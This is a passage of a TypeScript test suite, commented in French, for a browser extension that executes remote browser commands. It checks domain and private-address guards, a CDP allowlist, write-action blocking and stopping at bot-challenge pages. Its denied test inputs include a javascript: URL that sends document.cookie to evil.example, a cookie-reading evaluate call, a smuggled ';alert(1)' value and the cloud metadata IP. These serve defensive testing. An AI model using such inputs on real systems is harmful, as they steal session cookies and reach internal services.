// SPDX-License-Identifier: AGPL-3.0-only
// Exécuteur du tunnel dans l'extension (tâche 2.7, 07 § 3-5) avec un navigateur simulé : jeu fermé de commandes et
// liste blanche CDP (assert_no_remote_logic, assert_cdp_allowlist), garde des domaines et des adresses privées côté
// extension (assert_ssrf_guard), défi → plus aucune commande (assert_challenge_in_tunnel_stops), garde d'écriture
// (write_action_blocked), `stale_ref` avec le pilote CDP (assert_agent_step_stale_ref), onglets d'automatisation.
import { describe, expect, test } from 'vitest';
import type { CommandFrame, TunnelResult } from '@runtime/core/tunnel';
import type { BrowserApi, InPageRequest, InPageResult, PageInspection, TabInfo } from './browser-api.ts';
import { renderAxTree, type AxNode } from './cdp-driver.ts';
import { TunnelExecutor } from './tunnel-executor.ts';

const SHOP = 'zz-test-shop.example';
const RUN = '0e1d2c3b-4a59-4687-9123-abcdefabcdef';
let jobSeq = 0;
const job = () => `4f3c8a0e-1b2c-4d5e-8f90-${String(++jobSeq).padStart(12, '0')}`;

const CHALLENGE = '<html><head><title>Security check</title></head><body><p>Please verify you are human to continue.</p></body></html>';

type Page = { title: string; html: string; status: number; headers: Record<string, string> };

/** Page d'un autre site, avec des données personnelles (ne doit JAMAIS être lue par le tunnel). */
const FOREIGN = 'https://accounts.google.com/AccountChooser';
const FOREIGN_HTML = '<html><head><title>Choose an account</title></head><body>zz_test_private_user@gmail.example</body></html>';

type FakeOpts = {
  pages?: Record<string, Page>;
  granted?: boolean;
  frozen?: boolean;
  discarded?: boolean;
  ax?: () => AxNode[];
  /** Redirections serveur suivies par la navigation de l'onglet (chemin → URL finale). */
  redirects?: Record<string, string>;
  /** Élément sous le pointeur / focalisé (`DOM.describeNode`). */
  describe?: (params: Record<string, unknown>) => { nodeName: string; attributes: string[] };
  /** Effet d'une commande `Input.*` sur l'onglet (clic qui navigue…). */
  onInput?: (method: string, params: Record<string, unknown>, navigate: (url: string) => void) => void;
  /** Réponse de `http_fetch` / `page_fetch` : redirection non suivie (`redirect: 'manual'`). */
  fetchRedirect?: boolean;
  /** Hôtes accordés en plus de SHOP (permission d'hôte : `chrome.scripting` y lit la page). */
  grantedHosts?: string[];
  /**
   * `DOM.getNodeForLocation` (coordonnées du DOCUMENT, comme Chrome) : nœud touché, `null` = aucun nœud. `lastBox` :
   * dernier nœud mesuré par `DOM.getBoxModel`. Défaut : `lastBox`, sinon 7.
   */
  hit?: (params: Record<string, unknown>, lastBox: number | null) => number | null;
  /** Défilement de la page (`Page.getLayoutMetrics`, `cssVisualViewport.pageX/pageY`). */
  scroll?: { x: number; y: number };
};

const roleOf = (n: AxNode): string => (typeof n.role?.value === 'string' ? n.role.value : '');

/** Navigateur simulé : chaque appel est consigné ; aucun réseau. Comme Chrome, `scripting` échoue hors permission d'hôte. */
function fakeBrowser(opts: FakeOpts = {}) {
  const calls: string[] = [];
  /** Commandes CDP avec l'URL de l'onglet au moment de l'envoi. */
  const sent: { method: string; url: string }[] = [];
  const tabs = new Map<number, TabInfo & { autoDiscardable: boolean; grouped: boolean }>();
  let nextTab = 1;
  let attached = new Set<number>();
  const events = new Map<number, (method: string, params: unknown) => void>();
  let lastBox: number | null = null;
  const page = (url: string): Page =>
    url.startsWith(FOREIGN)
      ? { title: 'Choose an account', html: FOREIGN_HTML, status: 200, headers: { 'content-type': 'text/html' } }
      : (opts.pages?.[new URL(url).pathname] ?? { title: 'Shop', html: '<html><head><title>Shop</title></head><body>ok</body></html>', status: 200, headers: { 'content-type': 'text/html' } });
  const granted = (url: string): boolean => {
    try {
      const host = new URL(url).hostname;
      return host === SHOP || host.endsWith(`.${SHOP}`) || (opts.grantedHosts ?? []).includes(host);
    } catch {
      return false;
    }
  };
  const navigate = (tabId: number, raw: string) => {
    const path = new URL(raw).pathname;
    const url = opts.redirects?.[path] ?? raw;
    tabs.get(tabId)!.url = url;
    const p = page(url);
    events.get(tabId)?.('Network.responseReceived', { type: 'Document', response: { status: p.status, headers: p.headers, url } });
  };
  const api: BrowserApi = {
    tabs: {
      create: async (url) => {
        calls.push(`tabs.create ${url}`);
        const tab = { id: nextTab++, url, status: 'complete', active: false, autoDiscardable: true, grouped: false, ...(opts.frozen ? { frozen: true } : {}), ...(opts.discarded ? { discarded: true } : {}) };
        tabs.set(tab.id, tab);
        return tab;
      },
      get: async (id) => tabs.get(id) ?? null,
      keep: async (id) => {
        calls.push('tabs.keep');
        tabs.get(id)!.autoDiscardable = false;
      },
      reload: async (id) => {
        calls.push('tabs.reload');
        tabs.get(id)!.discarded = false;
      },
      remove: async (id) => {
        calls.push('tabs.remove');
        tabs.delete(id);
      },
      waitComplete: async () => true,
      group: async (id) => {
        calls.push('tabs.group');
        tabs.get(id)!.grouped = true;
      },
    },
    scripting: {
      pageFetch: async (tabId: number, request: InPageRequest): Promise<InPageResult> => {
        calls.push(`pageFetch ${request.method} ${request.url}`);
        if (opts.fetchRedirect) return { kind: 'redirect' };
        const p = page(request.url);
        return { kind: 'ok', status: p.status, headers: JSON.stringify(p.headers), body: p.html, url: request.url };
      },
      inspect: async (tabId: number): Promise<PageInspection> => {
        calls.push('inspect');
        const url = tabs.get(tabId)!.url ?? '';
        // chrome.scripting.executeScript : refusé sur un onglet sans permission d'hôte (autre domaine).
        if (!granted(url)) throw new Error('Cannot access contents of the page. Extension manifest must request permission to access the respective host.');
        const p = page(url);
        return { title: p.title, url: tabs.get(tabId)!.url ?? '', text: p.html };
      },
    },
    debugger: {
      attach: async (id) => {
        calls.push('debugger.attach');
        attached.add(id);
      },
      detach: async (id) => {
        calls.push('debugger.detach');
        attached = new Set([...attached].filter((t) => t !== id));
      },
      send: async (tabId, method, params) => {
        calls.push(`cdp ${method}`);
        sent.push({ method, url: tabs.get(tabId)?.url ?? '' });
        if (!attached.has(tabId)) throw new Error('not attached');
        if (method === 'Page.navigate') {
          navigate(tabId, (params as { url: string }).url);
          return { frameId: 'F', loaderId: 'L' };
        }
        if (method.startsWith('Input.')) opts.onInput?.(method, params ?? {}, (url) => navigate(tabId, url));
        if (method === 'DOM.getOuterHTML') return { outerHTML: page(tabs.get(tabId)!.url ?? 'about:blank').html };
        if (method === 'Accessibility.getFullAXTree') return { nodes: opts.ax?.() ?? [] };
        if (method === 'Accessibility.getPartialAXTree') {
          const id = (params as { backendNodeId: number }).backendNodeId;
          const tree = opts.ax?.() ?? [];
          if ((params as { fetchRelatives?: boolean }).fetchRelatives !== true) return { nodes: tree.filter((n) => n.backendDOMNodeId === id) };
          // Comme Chrome : le nœud visé, puis ses ancêtres jusqu'à la racine (`RootWebArea`).
          const target = tree.find((n) => n.backendDOMNodeId === id) ?? { nodeId: `n${id}`, role: { value: 'generic' }, name: { value: '' }, backendDOMNodeId: id };
          const chain: AxNode[] = [target];
          for (let cur = target, parent = tree.find((n) => n.childIds?.includes(cur.nodeId)); parent !== undefined; cur = parent, parent = tree.find((n) => n.childIds?.includes(cur.nodeId))) chain.push(parent);
          const top = chain[chain.length - 1]!;
          if (roleOf(top) !== 'RootWebArea') chain.push({ nodeId: 'root', role: { value: 'RootWebArea' }, name: { value: '' }, backendDOMNodeId: 1, childIds: [top.nodeId] });
          return { nodes: chain };
        }
        if (method === 'DOM.getBoxModel') {
          lastBox = (params as { backendNodeId?: number }).backendNodeId ?? null;
          return { model: { content: [0, 0, 10, 0, 10, 10, 0, 10] } };
        }
        if (method === 'Page.getLayoutMetrics') return { cssVisualViewport: { pageX: opts.scroll?.x ?? 0, pageY: opts.scroll?.y ?? 0, offsetX: 0, offsetY: 0 } };
        if (method === 'DOM.getNodeForLocation') {
          const id = opts.hit === undefined ? (lastBox ?? 7) : opts.hit(params ?? {}, lastBox);
          if (id === null) throw new Error('No node found at given location');
          return { backendNodeId: id };
        }
        if (method === 'DOM.describeNode') {
          const id = (params as { backendNodeId?: number; nodeId?: number }).backendNodeId ?? (params as { nodeId?: number }).nodeId;
          return { node: { backendNodeId: id, ...(opts.describe?.(params ?? {}) ?? (id === 7 ? { nodeName: 'BUTTON', attributes: ['type', 'submit'] } : { nodeName: 'DIV', attributes: [] })) } };
        }
        return {};
      },
      onEvent: (tabId, handler) => {
        events.set(tabId, handler);
        return () => events.delete(tabId);
      },
    },
    permissions: { contains: async () => opts.granted ?? true },
    fetch: async (url, init) => {
      calls.push(`fetch ${init.method} ${url}`);
      if (opts.fetchRedirect) return { status: 0, url, redirected: true, headers: [], text: async () => '' };
      const p = page(url);
      return { status: p.status, url, redirected: false, headers: Object.entries(p.headers), text: async () => p.html };
    },
  };
  return { api, calls, tabs, sent, pages: opts.pages ?? {} };
}

function executor(browser: BrowserApi, domains = [SHOP]) {
  return new TunnelExecutor({ browser, connectedDomains: async () => new Set(domains), setTimeout: () => null, clearTimeout: () => undefined });
}

const frame = (cmd: CommandFrame['cmd'], args: unknown, extra: Partial<CommandFrame> = {}): CommandFrame => ({
  type: 'cmd',
  job_id: job(),
  run_id: RUN,
  cmd,
  domain: SHOP,
  args,
  timeout_ms: 30_000,
  allow_write_actions: false,
  ...extra,
});

const err = (r: TunnelResult) => (r.ok ? null : r.error);

describe('assert_ssrf_guard (extension) : domaines connectés, adresses privées refusées même pour un domaine connecté', () => {
  test.each([
    ['evil.example', 'https://evil.example/'],
    ['169.254.169.254', 'http://169.254.169.254/latest/meta-data/'],
    ['localhost', 'http://localhost/'],
    ['10.0.0.5', 'http://10.0.0.5/'],
    ['192.168.1.1', 'http://192.168.1.1/'],
    ['printer.local', 'http://printer.local/'],
  ])('commande vers %s : refus, aucun appel au navigateur', async (domain, url) => {
    const b = fakeBrowser();
    // Un domaine public non connecté (evil.example) est refusé ; une adresse privée l'est même « connectée ».
    const ex = executor(b.api, domain === 'evil.example' ? [SHOP] : [SHOP, domain]);
    expect(err(await ex.run(frame('page_fetch', { url }, { domain })))).toBe('domain_not_allowed');
    expect(err(await ex.run(frame('http_fetch', { url }, { domain })))).toBe('domain_not_allowed');
    expect(b.calls).toEqual([]);
  });

  test('domaine connecté mais URL hors domaine : refus ; domaine non connecté ici : refus ; permission retirée : permission_required', async () => {
    const b = fakeBrowser();
    const ex = executor(b.api);
    expect(err(await ex.run(frame('page_fetch', { url: 'https://evil.example/' })))).toBe('domain_not_allowed');
    expect(err(await executor(b.api, []).run(frame('page_fetch', { url: `https://${SHOP}/` })))).toBe('domain_not_allowed');
    expect(err(await executor(fakeBrowser({ granted: false }).api).run(frame('page_fetch', { url: `https://${SHOP}/` })))).toBe('permission_required');
    expect(b.calls).toEqual([]);
  });
});

describe('assert_no_remote_logic / assert_cdp_allowlist : jeu fermé, rien n’est évalué', () => {
  test.each([
    ['Runtime.evaluate', { expression: 'document.cookie' }],
    ['Runtime.callFunctionOn', { functionDeclaration: 'function(){return 1}' }],
    ['Emulation.setUserAgentOverride', { userAgent: 'x' }],
    ['Page.addScriptToEvaluateOnNewDocument', { source: 'alert(1)' }],
    ['Network.getCookies', {}],
    ['Page.navigate', { url: 'javascript:fetch("https://evil.example/"+document.cookie)' }],
    ['DOM.querySelector', { nodeId: 1, selector: 'a', expression: '1+1' }],
  ])('page_script %s : method_not_allowed, aucun appel au navigateur', async (method, params) => {
    const b = fakeBrowser();
    const r = await executor(b.api).run(frame('page_script', { method, params }));
    expect(err(r)).toBe('method_not_allowed');
    expect(b.calls).toEqual([]);
  });

  test('agent_step avec du code dans un champ, ou une action hors contrat : method_not_allowed', async () => {
    const b = fakeBrowser();
    const ex = executor(b.api);
    const r1 = await ex.run(frame('agent_step', { action: 'evaluate', script: 'document.cookie' }));
    expect(err(r1)).toBe('method_not_allowed');
    const r2 = await ex.run(frame('agent_step', { action: 'click', ref: 'e1;alert(1)', snapshot_id: 's1' }));
    expect(err(r2)).toBe('method_not_allowed');
    expect(b.calls.filter((c) => c.startsWith('cdp Runtime') || c.startsWith('cdp Input'))).toEqual([]);
  });
});

describe('assert_challenge_in_tunnel_stops : défi détecté → 0 commande ensuite', () => {
  test('page_fetch qui rend un défi : challenge_in_tunnel, puis plus aucune commande n’atteint le navigateur', async () => {
    const b = fakeBrowser({ pages: { '/api/data': { title: 'Security check', html: CHALLENGE, status: 403, headers: { 'content-type': 'text/html' } } } });
    const ex = executor(b.api);
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data` })))).toBe('challenge_in_tunnel');
    const before = b.calls.length;
    for (const f of [frame('page_fetch', { url: `https://${SHOP}/other` }), frame('page_script', { method: 'DOM.getDocument', params: {} }), frame('agent_step', { action: 'read' }), frame('http_fetch', { url: `https://${SHOP}/` })]) {
      expect(err(await ex.run(f))).toBe('challenge_in_tunnel');
    }
    expect(b.calls.length).toBe(before);
    expect(ex.withheld).toBe(4);
    // L'onglet est laissé à l'utilisateur (aucune fermeture, aucune prise de contrôle).
    await ex.release(RUN);
    expect(b.calls).not.toContain('tabs.remove');
  });

  test('défi sur la page d’accueil du site (avant toute requête de données) : arrêt immédiat', async () => {
    const b = fakeBrowser({ pages: { '/': { title: 'Just a moment...', html: CHALLENGE, status: 503, headers: { 'content-type': 'text/html' } } } });
    const ex = executor(b.api);
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data` })))).toBe('challenge_in_tunnel');
    expect(b.calls.some((c) => c.startsWith('pageFetch'))).toBe(false);
  });

  test('page_script : navigation vers un défi → challenge_in_tunnel, débogueur détaché', async () => {
    const b = fakeBrowser({ pages: { '/list': { title: 'Security check', html: CHALLENGE, status: 403, headers: { 'content-type': 'text/html' } } } });
    const ex = executor(b.api);
    expect(err(await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/list` } })))).toBe('challenge_in_tunnel');
    expect(b.calls).toContain('debugger.detach');
    const n = b.calls.length;
    expect(err(await ex.run(frame('page_script', { method: 'DOM.getDocument', params: {} })))).toBe('challenge_in_tunnel');
    expect(b.calls.length).toBe(n);
  });

  test('agent_step : défi dans l’arbre d’accessibilité → challenge_in_tunnel, aucune action ensuite', async () => {
    const tree: AxNode[] = [
      { nodeId: '1', role: { value: 'RootWebArea' }, name: { value: 'Just a moment...' }, childIds: ['2'], backendDOMNodeId: 1 },
      { nodeId: '2', role: { value: 'StaticText' }, name: { value: 'Verify you are human' } },
    ];
    const b = fakeBrowser({ ax: () => tree });
    const ex = executor(b.api);
    expect(err(await ex.run(frame('agent_step', { action: 'read' })))).toBe('challenge_in_tunnel');
    const n = b.calls.length;
    expect(err(await ex.run(frame('agent_step', { action: 'click', ref: 'e1', snapshot_id: 's1-abcdef' })))).toBe('challenge_in_tunnel');
    expect(b.calls.length).toBe(n);
  });
});

describe('garde d’écriture (write_action_blocked)', () => {
  test('clic sur un bouton d’envoi, touche Entrée, DELETE : refusés sans allow_write_actions', async () => {
    const b = fakeBrowser();
    const ex = executor(b.api);
    expect(err(await ex.run(frame('page_script', { method: 'Input.dispatchMouseEvent', params: { type: 'mousePressed', x: 5, y: 5, button: 'left', clickCount: 1 } })))).toBe('write_action_blocked');
    expect(err(await ex.run(frame('page_script', { method: 'Input.dispatchKeyEvent', params: { type: 'keyDown', key: 'Enter' } })))).toBe('write_action_blocked');
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/order`, method: 'DELETE' })))).toBe('write_action_blocked');
    expect(b.calls).not.toContain('cdp Input.dispatchMouseEvent');
    expect(b.calls).not.toContain('cdp Input.dispatchKeyEvent');
    // Avec allow_write_actions confirmé : le clic part.
    expect((await ex.run(frame('page_script', { method: 'Input.dispatchMouseEvent', params: { type: 'mousePressed', x: 5, y: 5 } }, { allow_write_actions: true }))).ok).toBe(true);
  });
});

describe('correctifs de vérification (2.7)', () => {
  test('correctif 1 : POST déclaratif (recherche) en page_fetch accepté sans allow_write_actions', async () => {
    const b = fakeBrowser();
    const r = await executor(b.api).run(frame('page_fetch', { url: `https://${SHOP}/api/search`, method: 'POST', headers: { 'content-type': 'application/json' }, body: '{"q":"x"}' }));
    expect(r.ok).toBe(true);
    expect(b.calls).toContain(`pageFetch POST https://${SHOP}/api/search`);
  });

  test('correctif 3 : défi rendu en JSON (XHR DataDome 403) → challenge_in_tunnel, plus aucune commande', async () => {
    const datadome = { title: '', html: '{"url":"https://geo.captcha-delivery.com/captcha/?initialCid=zz_test&t=fe"}', status: 403, headers: { 'content-type': 'application/json', 'x-datadome': 'protected' } };
    const b = fakeBrowser({ pages: { '/api/search': datadome } });
    const ex = executor(b.api);
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/search` })))).toBe('challenge_in_tunnel');
    const n = b.calls.length;
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/search?page=2` })))).toBe('challenge_in_tunnel');
    expect(b.calls.length).toBe(n);
    // http_fetch : même détection sur un corps JSON.
    const b2 = fakeBrowser({ pages: { '/api/search': datadome } });
    expect(err(await executor(b2.api).run(frame('http_fetch', { url: `https://${SHOP}/api/search` })))).toBe('challenge_in_tunnel');
  });

  test('correctif 4 : clic → page de défi → clic suivant refusé, onglet verrouillé', async () => {
    const pages = { '/challenge': { title: 'Security check', html: CHALLENGE, status: 403, headers: { 'content-type': 'text/html' } } };
    const b = fakeBrowser({
      pages,
      describe: () => ({ nodeName: 'A', attributes: ['href', '/challenge'] }),
      onInput: (method, params, navigate) => {
        if (method === 'Input.dispatchMouseEvent' && params['type'] === 'mouseReleased') navigate(`https://${SHOP}/challenge`);
      },
    });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/list` } }))).ok).toBe(true);
    expect((await ex.run(frame('page_script', { method: 'Input.dispatchMouseEvent', params: { type: 'mousePressed', x: 5, y: 5, button: 'left', clickCount: 1 } }))).ok).toBe(true);
    // Le relâchement du clic mène au défi : détecté aussitôt (attente de chargement puis inspection).
    expect(err(await ex.run(frame('page_script', { method: 'Input.dispatchMouseEvent', params: { type: 'mouseReleased', x: 5, y: 5, button: 'left', clickCount: 1 } })))).toBe('challenge_in_tunnel');
    const n = b.calls.length;
    expect(err(await ex.run(frame('page_script', { method: 'Input.dispatchMouseEvent', params: { type: 'mousePressed', x: 9, y: 9, button: 'left', clickCount: 1 } })))).toBe('challenge_in_tunnel');
    expect(b.calls.length).toBe(n);
    expect(b.sent.filter((c) => c.url.endsWith('/challenge') && c.method.startsWith('Input.'))).toEqual([]);
    expect(b.calls).toContain('debugger.detach');
  });

  test('correctif 14 : défi injecté après le chargement (ou après Page.reload) → détecté AVANT la commande suivante', async () => {
    const pages: Record<string, Page> = {};
    const b = fakeBrowser({ pages });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/list` } }))).ok).toBe(true);
    pages['/list'] = { title: 'Just a moment...', html: CHALLENGE, status: 200, headers: { 'content-type': 'text/html' } };
    const n = b.sent.length;
    expect(err(await ex.run(frame('page_script', { method: 'DOM.getDocument', params: { depth: 0 } })))).toBe('challenge_in_tunnel');
    expect(b.sent.length).toBe(n);

    const pages2: Record<string, Page> = {};
    const b2 = fakeBrowser({ pages: pages2 });
    const ex2 = executor(b2.api);
    expect((await ex2.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/list` } }))).ok).toBe(true);
    pages2['/list'] = { title: 'Security check', html: CHALLENGE, status: 403, headers: { 'content-type': 'text/html' } };
    expect(err(await ex2.run(frame('page_script', { method: 'Page.reload', params: {} })))).toBe('challenge_in_tunnel');
  });

  test('correctif 12 : navigation dans le domaine qui redirige vers un autre site → domain_not_allowed, rien n’est lu sur ce site', async () => {
    const b = fakeBrowser({ redirects: { '/redirect': FOREIGN } });
    const ex = executor(b.api);
    const r = await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/redirect` } }));
    expect(err(r)).toBe('domain_not_allowed');
    expect(JSON.stringify(r)).not.toContain('accounts.google.com');
    // Débogueur détaché, onglet du site tiers fermé.
    expect(b.calls).toContain('debugger.detach');
    expect(b.calls).toContain('tabs.remove');
    const read = await ex.run(frame('page_script', { method: 'DOM.getOuterHTML', params: { nodeId: 1 } }));
    expect(JSON.stringify(read)).not.toContain('zz_test_private_user');
    expect(b.sent.filter((c) => c.url.startsWith(FOREIGN) && c.method !== 'Page.navigate')).toEqual([]);
  });

  test('correctif 12 : redirection JavaScript différée vers un autre site → la commande suivante est refusée avant envoi', async () => {
    const b = fakeBrowser();
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/list` } }))).ok).toBe(true);
    b.tabs.get(1)!.url = FOREIGN; // location.href = … pendant le sondage DOM.querySelector
    for (const f of [frame('page_script', { method: 'DOM.getOuterHTML', params: { nodeId: 1 } }), frame('page_script', { method: 'Accessibility.getFullAXTree', params: {} })]) {
      const r = await ex.run(f);
      expect(JSON.stringify(r)).not.toContain('zz_test_private_user');
    }
    expect(b.sent.filter((c) => c.url.startsWith(FOREIGN))).toEqual([]);
    expect(b.calls).toContain('tabs.remove');
  });

  test('correctif 12 : agent_step sur un onglet passé sur un autre site → domain_not_allowed, aucun arbre rendu', async () => {
    const tree: AxNode[] = [{ nodeId: '1', role: { value: 'RootWebArea' }, name: { value: 'Choose an account' }, childIds: [], backendDOMNodeId: 1 }];
    const b = fakeBrowser({ ax: () => tree });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/list` } }))).ok).toBe(true);
    b.tabs.get(1)!.url = FOREIGN;
    const r = await ex.run(frame('agent_step', { action: 'read' }));
    expect(err(r)).toBe('domain_not_allowed');
    expect(JSON.stringify(r)).not.toContain('Choose an account');
    expect(b.sent.filter((c) => c.url.startsWith(FOREIGN))).toEqual([]);
  });

  test('correctif 12 : document d’une iframe d’un autre site (Network.responseReceived) → ignoré, la page du domaine reste lisible', async () => {
    const b = fakeBrowser();
    const send = b.api.debugger.send;
    let handler: ((method: string, params: unknown) => void) | null = null;
    const onEvent = b.api.debugger.onEvent;
    b.api.debugger.onEvent = (tabId, h) => {
      handler = h;
      return onEvent(tabId, h);
    };
    b.api.debugger.send = async (tabId, method, params) => {
      if (method === 'Page.getFrameTree') return { frameTree: { frame: { id: 'MAIN' } } };
      const out = await send(tabId, method, params);
      // Une iframe d'un autre site se charge pendant la navigation.
      if (method === 'Page.navigate') handler?.('Network.responseReceived', { type: 'Document', frameId: 'IFRAME', response: { status: 200, headers: {}, url: 'https://www.youtube-nocookie.com/embed/x' } });
      return out;
    };
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/video` } }))).ok).toBe(true);
    expect((await ex.run(frame('page_script', { method: 'DOM.getDocument', params: { depth: 0 } }))).ok).toBe(true);
  });

  test('correctif 12 : inspection impossible sur une page du domaine → refus (fermé), jamais « pas de défi »', async () => {
    const b = fakeBrowser();
    b.api.scripting.inspect = async () => {
      throw new Error('Frame with ID 0 is showing error page');
    };
    b.api.debugger.send = async () => {
      throw new Error('not attached');
    };
    const r = await executor(b.api).run(frame('page_fetch', { url: `https://${SHOP}/api/data` }));
    expect(r.ok).toBe(false);
    expect(b.calls.some((c) => c.startsWith('pageFetch'))).toBe(false);
  });

  test('correctifs 7 et 13 : Espace, \\r, code 13, DOM.focus sur un bouton d’envoi → write_action_blocked, rien n’est envoyé', async () => {
    const b = fakeBrowser({ describe: (p) => (p['backendNodeId'] === 7 || p['nodeId'] === 7 ? { nodeName: 'BUTTON', attributes: ['type', 'submit'] } : { nodeName: 'INPUT', attributes: ['type', 'text'] }) });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_script', { method: 'Page.navigate', params: { url: `https://${SHOP}/form` } }))).ok).toBe(true);
    for (const params of [
      { type: 'keyDown', key: ' ', code: 'Space' },
      { type: 'keyUp', key: ' ', code: 'Space' },
      { type: 'char', text: '\r' },
      { type: 'keyDown', windowsVirtualKeyCode: 13, text: '\r' },
      { type: 'rawKeyDown', windowsVirtualKeyCode: 32 },
    ]) {
      expect(err(await ex.run(frame('page_script', { method: 'Input.dispatchKeyEvent', params }))), JSON.stringify(params)).toBe('write_action_blocked');
    }
    expect(err(await ex.run(frame('page_script', { method: 'DOM.focus', params: { backendNodeId: 7 } })))).toBe('write_action_blocked');
    expect(b.calls).not.toContain('cdp Input.dispatchKeyEvent');
    expect(b.calls).not.toContain('cdp DOM.focus');
    // Champ texte : focus et lettre permis ; avec allow_write_actions, Espace part.
    expect((await ex.run(frame('page_script', { method: 'DOM.focus', params: { backendNodeId: 3 } }))).ok).toBe(true);
    expect((await ex.run(frame('page_script', { method: 'Input.dispatchKeyEvent', params: { type: 'keyDown', key: 'a', code: 'KeyA', text: 'a' } }))).ok).toBe(true);
    expect((await ex.run(frame('page_script', { method: 'Input.dispatchKeyEvent', params: { type: 'keyDown', key: ' ', code: 'Space' } }, { allow_write_actions: true }))).ok).toBe(true);
  });

  test('correctifs 8 et 16 : redirection d’un fetch non suivie (redirect: manual) → fetch_failed, rien n’est rendu', async () => {
    const b = fakeBrowser({ fetchRedirect: true });
    const ex = executor(b.api);
    expect(err(await ex.run(frame('http_fetch', { url: `https://${SHOP}/go` })))).toBe('fetch_failed');
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/go` })))).toBe('fetch_failed');
  });
});

describe('correctifs de vérification 2 (2.7)', () => {
  const CF_WAIT: Page = {
    title: 'Just a moment...',
    html: '<html><head><title>Just a moment...</title><script src="https://challenges.cloudflare.com/turnstile/v0/api.js"></script></head><body>Checking your browser</body></html>',
    status: 200,
    headers: { 'content-type': 'text/html' },
  };
  const pageFetches = (calls: string[]) => calls.filter((c) => c.startsWith('pageFetch')).length;

  test('assert_challenge_in_tunnel_stops (page_fetch) : onglet du run passé sur un défi, ou rechargé sur un défi → challenge_in_tunnel, pageFetch jamais appelé', async () => {
    const b = fakeBrowser({ pages: { '/wait': CF_WAIT } });
    const ex = executor(b.api);
    expect((await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data` }))).ok).toBe(true);
    b.tabs.get(1)!.url = `https://${SHOP}/wait`; // la page de l'onglet affiche maintenant un défi Cloudflare
    const n = pageFetches(b.calls);
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data?page=2` })))).toBe('challenge_in_tunnel');
    expect(pageFetches(b.calls)).toBe(n);
    const m = b.calls.length;
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data?page=3` })))).toBe('challenge_in_tunnel');
    expect(b.calls.length).toBe(m);

    // Onglet déchargé, rechargé sur un défi : inspecté APRÈS le rechargement, avant toute requête.
    const d = fakeBrowser({ pages: { '/wait': CF_WAIT } });
    const ex2 = executor(d.api);
    expect((await ex2.run(frame('page_fetch', { url: `https://${SHOP}/api/data` }))).ok).toBe(true);
    Object.assign(d.tabs.get(1)!, { discarded: true, url: `https://${SHOP}/wait` });
    const k = pageFetches(d.calls);
    expect(err(await ex2.run(frame('page_fetch', { url: `https://${SHOP}/api/data?page=2` })))).toBe('challenge_in_tunnel');
    expect(d.calls).toContain('tabs.reload');
    expect(pageFetches(d.calls)).toBe(k);
  });

  test('assert_ssrf_guard (page_fetch) : onglet du run emmené sur un autre domaine, même connecté → domain_not_allowed, rien n’y tourne', async () => {
    const OTHER = 'other.example';
    const b = fakeBrowser({ grantedHosts: [OTHER] });
    const ex = executor(b.api, [SHOP, OTHER]);
    expect((await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data` }))).ok).toBe(true);
    b.tabs.get(1)!.url = `https://${OTHER}/login`;
    const n = pageFetches(b.calls);
    expect(err(await ex.run(frame('page_fetch', { url: `https://${SHOP}/api/data?page=2` })))).toBe('domain_not_allowed');
    expect(pageFetches(b.calls)).toBe(n);
    expect(b.calls).toContain('tabs.remove');
    // Onglet gelé emmené ailleurs : même refus après le dégel.
    const f = fakeBrowser({ grantedHosts: [OTHER] });
    const ex2 = executor(f.api, [SHOP, OTHER]);
    expect((await ex2.run(frame('page_fetch', { url: `https://${SHOP}/api/data` }))).ok).toBe(true);
    Object.assign(f.tabs.get(1)!, { frozen: true, url: `https://${OTHER}/login` });
    expect(err(await ex2.run(frame('page_fetch', { url: `https://${SHOP}/api/data?page=2` })))).toBe('domain_not_allowed');
    expect(pageFetches(f.calls)).toBe(1);
  });

  // Page défilée de 1733 px : <form><button>OK</button></form> (bouton sans type = envoi), un <span> dedans, un lien
  // à côté, et une couche `pointer-events:none` posée par-dessus toute la fenêtre.
  const SCROLL = 1733;
  const formTree = (): AxNode[] => [
    { nodeId: '1', role: { value: 'RootWebArea' }, name: { value: 'Shop' }, childIds: ['8', '20', '50'], backendDOMNodeId: 1 },
    { nodeId: '8', role: { value: 'form' }, name: { value: '' }, childIds: ['9', '12'], backendDOMNodeId: 8 },
    { nodeId: '9', role: { value: 'button' }, name: { value: 'OK' }, childIds: ['2'], backendDOMNodeId: 9 },
    { nodeId: '2', role: { value: 'generic' }, name: { value: '' }, childIds: [], backendDOMNodeId: 2 },
    { nodeId: '12', role: { value: 'button' }, name: { value: 'Suivant' }, childIds: [], backendDOMNodeId: 12 },
    { nodeId: '20', role: { value: 'link' }, name: { value: 'Page 2' }, childIds: [], backendDOMNodeId: 20 },
    { nodeId: '50', role: { value: 'generic' }, name: { value: '' }, ignored: true, childIds: [], backendDOMNodeId: 50 },
  ];
  const formDom = (p: Record<string, unknown>): { nodeName: string; attributes: string[] } => {
    const id = p['backendNodeId'] ?? p['nodeId'];
    if (id === 9) return { nodeName: 'BUTTON', attributes: [] };
    if (id === 12) return { nodeName: 'BUTTON', attributes: ['type', 'submit', 'class', 'next'] };
    if (id === 2) return { nodeName: 'SPAN', attributes: [] };
    if (id === 8) return { nodeName: 'FORM', attributes: ['action', '/save'] };
